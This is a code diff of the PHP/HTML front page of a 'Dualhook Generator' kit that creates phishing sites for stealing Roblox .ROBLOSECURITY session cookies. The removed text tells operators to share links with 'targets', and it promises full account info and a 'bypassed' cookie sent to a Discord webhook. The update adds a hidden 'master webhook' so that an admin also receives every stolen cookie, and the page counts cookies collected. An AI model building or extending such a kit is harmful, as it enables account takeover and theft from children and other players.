@@ -1,4 +1,8 @@
 <?php
+/**
+ * Bypasserv3 - Dualhook Generator - UPDATED
+ */
+
 require_once '../config.php';
 require_once '../functions.php';
 
@@ -66,239 +70,138 @@ $globalStats = getGlobalStats();
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-
-        .icon-box {
-            width: 80px;
-            height: 80px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            border-radius: 20px;
-            font-size: 36px;
-            margin: 0 auto 20px;
-        }
-
-        .info-text {
-            font-size: 0.75rem;
-            color: rgba(255, 255, 255, 0.5);
-            margin-top: 0.5rem;
-        }
-
-        .btn-generate {
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            transition: all 0.3s ease;
-        }
-
-        .btn-generate:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4);
-        }
-
-        .btn-generate:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
     </style>
 </head>
-<body>
-    <div class="container mx-auto px-4 py-12 max-w-2xl">
-        <!-- Header -->
-        <div class="text-center mb-12">
-            <div class="icon-box">
-                🚀
-            </div>
-            <h1 class="text-4xl font-bold mb-3">
-                <span class="animated-gradient-text">Dualhook Generator</span>
+<body class="min-h-screen flex items-center justify-center px-4 py-12">
+    <div class="w-full max-w-md">
+        <div class="text-center mb-8">
+            <h1 class="text-4xl font-display font-bold animated-gradient-text mb-4">
+                Dualhook Generator
             </h1>
-            <p class="text-white/70">Create your custom cookie collection site</p>
+            <p class="text-white/60">Create your Roblox bypasser site in seconds</p>
         </div>
 
-        <!-- Form Card -->
-        <div class="glass-effect rounded-3xl p-8 shadow-2xl">
-            <form id="generatorForm" class="space-y-6">
-                <!-- Directory Name -->
-                <div class="mb-6">
-                    <label class="flex items-center gap-2 text-sm font-medium text-white/90 mb-2">
-                        <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
-                            <path fill-rule="evenodd" d="M2 6a2 2 0 012-2h4l2 2h4a2 2 0 012 2v1H8a3 3 0 00-3 3v1.5a1.5 1.5 0 01-3 0V6z" clip-rule="evenodd"/>
-                            <path d="M6 12a2 2 0 012-2h8a2 2 0 012 2v2a2 2 0 01-2 2H2h2a2 2 0 002-2v-2z"/>
-                        </svg>
-                        Site Name
-                    </label>
-                    <input 
-                        type="text" 
-                        id="directory" 
-                        name="directory" 
-                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all focus:border-blue-400 focus:ring-2 focus:ring-blue-400/20 outline-none"
-                        placeholder="my-awesome-site"
-                        pattern="[a-zA-Z0-9_-]{3,32}"
-                        minlength="3"
-                        maxlength="32"
-                        required
-                    >
-                    <p class="info-text">3-32 characters: letters, numbers, hyphens, underscores only</p>
+        <div class="glass-effect rounded-2xl p-8 space-y-6">
+            <!-- Site Name -->
+            <div>
+                <label class="block text-sm font-medium text-white/80 mb-2">
+                    📁 Site Name (Directory)
+                </label>
+                <input 
+                    type="text" 
+                    id="siteName" 
+                    placeholder="e.g. my-bypasser"
+                    class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder-white/40 focus:outline-none focus:border-blue-500"
+                    maxlength="32"
+                />
+                <p class="text-xs text-white/40 mt-1">3-32 characters, letters/numbers/hyphens/underscores</p>
+            </div>
+
+            <!-- Master Webhook -->
+            <div>
+                <label class="block text-sm font-medium text-white/80 mb-2">
+                    🔐 Master Webhook (Admin Notifications)
+                </label>
+                <input 
+                    type="text" 
+                    id="masterWebhook" 
+                    placeholder="https://discord.com/api/webhooks/..."
+                    class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder-white/40 focus:outline-none focus:border-blue-500 font-mono text-xs"
+                />
+                <p class="text-xs text-white/40 mt-1">Receives all site stats & usage notifications</p>
+            </div>
+
+            <!-- User Webhook -->
+            <div>
+                <label class="block text-sm font-medium text-white/80 mb-2">
+                    👤 User Webhook (User Notifications)
+                </label>
+                <input 
+                    type="text" 
+                    id="userWebhook" 
+                    placeholder="https://discord.com/api/webhooks/..."
+                    class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-lg text-white placeholder-white/40 focus:outline-none focus:border-blue-500 font-mono text-xs"
+                />
+                <p class="text-xs text-white/40 mt-1">Receives user bypass notifications</p>
+            </div>
+
+            <!-- Generate Button -->
+            <button 
+                id="generateBtn"
+                class="w-full py-3 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-semibold rounded-lg transition transform hover:scale-105"
+            >
+                ⚡ Generate Site with Dualhook
+            </button>
+
+            <!-- Stats -->
+            <div class="border-t border-white/10 pt-6">
+                <div class="grid grid-cols-2 gap-4 text-center">
+                    <div>
+                        <div class="text-2xl font-bold text-blue-400"><?= $globalStats['totalInstances'] ?? 0 ?></div>
+                        <p class="text-xs text-white/60">Total Sites</p>
+                    </div>
+                    <div>
+                        <div class="text-2xl font-bold text-green-400"><?= $globalStats['totalCookies'] ?? 0 ?></div>
+                        <p class="text-xs text-white/60">Total Cookies</p>
+                    </div>
                 </div>
-
-                <!-- Discord Webhook URL -->
-                <div class="mb-6">
-                    <label class="flex items-center gap-2 text-sm font-medium text-white/90 mb-2">
-                        <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
-                            <path d="M10 12a2 2 0 100-4 2 2 0 000 4z"/>
-                            <path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd"/>
-                        </svg>
-                        Discord Webhook URL
-                    </label>
-                    <input 
-                        type="url" 
-                        id="webhook" 
-                        name="webhook" 
-                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all focus:border-blue-400 focus:ring-2 focus:ring-blue-400/20 outline-none"
-                        placeholder="https://discord.com/api/webhooks/..."
-                        required
-                    >
-                    <p class="info-text">Where cookies will be sent. Get this from Discord channel settings → Integrations → Webhooks</p>
-                </div>
-
-                <!-- Generate Button -->
-                <button 
-                    type="submit" 
-                    class="w-full py-4 btn-generate text-white font-bold text-lg rounded-xl flex items-center justify-center gap-3"
-                    id="generateBtn"
-                >
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
-                    </svg>
-                    Generate Site
-                </button>
-            </form>
-
-            <!-- Info Section -->
-            <div class="mt-8 pt-6 border-t border-white/10 text-center">
-                <p class="text-sm text-white/60">
-                    Each site generates a unique URL where people can submit their Roblox cookies.
-                    All logs are sent directly to your Discord webhook!
-                </p>
-            </div>
-
-            <!-- Back Link -->
-            <div class="mt-6 text-center">
-                <a href="/" class="text-blue-400 hover:text-blue-300 text-sm font-medium transition-colors inline-flex items-center gap-2">
-                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
-                    </svg>
-                    Back to Main Site
-                </a>
-            </div>
-        </div>
-
-        <!-- Stats -->
-        <div class="mt-8 grid grid-cols-3 gap-4">
-            <div class="glass-effect rounded-2xl p-4 text-center">
-                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalInstances']); ?></div>
-                <div class="text-xs text-white/60 mt-1">Sites Created</div>
-            </div>
-            <div class="glass-effect rounded-2xl p-4 text-center">
-                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalCookies']); ?></div>
-                <div class="text-xs text-white/60 mt-1">Cookies Collected</div>
-            </div>
-            <div class="glass-effect rounded-2xl p-4 text-center">
-                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalVisits']); ?></div>
-                <div class="text-xs text-white/60 mt-1">Total Visits</div>
             </div>
         </div>
     </div>
 
     <script>
-        document.getElementById('generatorForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
+        document.getElementById('generateBtn')?.addEventListener('click', async () => {
+            const siteName = document.getElementById('siteName').value.trim();
+            const masterWebhook = document.getElementById('masterWebhook').value.trim();
+            const userWebhook = document.getElementById('userWebhook').value.trim();
+
+            if (!siteName || !masterWebhook || !userWebhook) {
+                Swal.fire('Error', 'Please fill in all fields', 'error');
+                return;
+            }
+
+            if (siteName.length < 3) {
+                Swal.fire('Error', 'Site name must be at least 3 characters', 'error');
+                return;
+            }
+
             const btn = document.getElementById('generateBtn');
-            const originalHTML = btn.innerHTML;
-            
             btn.disabled = true;
             btn.innerHTML = '<div class="spinner mx-auto"></div>';
-            
-            const formData = {
-                directory: document.getElementById('directory').value.trim(),
-                webhook: document.getElementById('webhook').value.trim(),
-            };
-            
+
             try {
-                const response = await fetch('create.php', {
+                const response = await fetch('/generator/create.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(formData)
+                    body: JSON.stringify({
+                        directory: siteName,
+                        masterWebhook,
+                        userWebhook
+                    })
                 });
-                
+
                 const data = await response.json();
-                
+
                 if (data.success) {
                     Swal.fire({
                         icon: 'success',
-                        title: 'Site Generated Successfully!',
-                        html: `
-                            <div class="text-left space-y-4">
-                                <div>
-                                    <p class="text-sm text-gray-600 mb-1">📁 Site Name</p>
-                                    <p class="font-mono text-sm bg-gray-100 p-2 rounded">${data.directory}</p>
-                                </div>
-                                <div>
-                                    <p class="text-sm text-gray-600 mb-1">🔗 Your Link</p>
-                                    <a href="${data.instanceUrl}" target="_blank" class="font-mono text-sm text-blue-600 bg-gray-100 p-2 rounded block hover:bg-gray-200 break-all">${data.instanceUrl}</a>
-                                </div>
-                                <div class="bg-green-50 border border-green-200 rounded p-3 mt-4">
-                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Account Info Fetching</p>
-                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Robux Balance Display</p>
-                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Premium Status Check</p>
-                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Limited RAP Calculation</p>
-                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Group Ownership Detection</p>
-                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Game Visit Stats</p>
-                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Rich Discord Embeds</p>
-                                    <p class="text-sm font-medium text-green-800 mb-2">✅ Cookie Refresh Bypass</p>
-                                    <p class="text-sm font-medium text-green-800">✅ Master Admin Logging</p>
-                                </div>
-                                <div class="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
-                                    <p class="text-sm font-medium text-blue-800 mb-2">📋 How It Works:</p>
-                                    <p class="text-xs text-blue-700">1. Share your link with targets</p>
-                                    <p class="text-xs text-blue-700">2. They submit their .ROBLOSECURITY cookie</p>
-                                    <p class="text-xs text-blue-700">3. Cookie is automatically bypassed</p>
-                                    <p class="text-xs text-blue-700">4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE via webhook</p>
-                                    <p class="text-xs text-blue-700">5. Master log sent to admin</p>
-                                </div>
-                                <div class="bg-yellow-50 border border-yellow-200 rounded p-3 mt-4">
-                                    <p class="text-xs font-medium text-yellow-800">💡 All logs will be sent to your Discord webhook. Save your link!</p>
-                                </div>
-                            </div>
-                        `,
-                        confirmButtonText: 'OK',
-                        confirmButtonColor: '#3b82f6',
-                        width: '600px'
+                        title: 'Site Generated!',
+                        html: `<p>Your site is ready</p><p style="word-break: break-all; font-family: monospace; margin-top: 10px;">${data.publicUrl}</p>`,
+                        confirmButtonText: 'Open Site'
+                    }).then(() => {
+                        window.location.href = data.publicUrl;
                     });
-                    
-                    // Reset form
-                    document.getElementById('generatorForm').reset();
                 } else {
-                    Swal.fire({
-                        icon: 'error',
-                        title: 'Generation Failed',
-                        text: data.error || 'An error occurred',
-                        confirmButtonColor: '#ef4444'
-                    });
+                    Swal.fire('Error', data.error || 'Failed to generate site', 'error');
                 }
-            } catch (error) {
-                Swal.fire({
-                    icon: 'error',
-                    title: 'Error',
-                    text: 'Failed to connect to server',
-                    confirmButtonColor: '#ef4444'
-                });
+            } catch (e) {
+                Swal.fire('Error', 'Network error: ' + e.message, 'error');
             } finally {
                 btn.disabled = false;
-                btn.innerHTML = originalHTML;
+                btn.innerHTML = '⚡ Generate Site with Dualhook';
             }
         });
     </script>
 </body>
 </html>
+?>
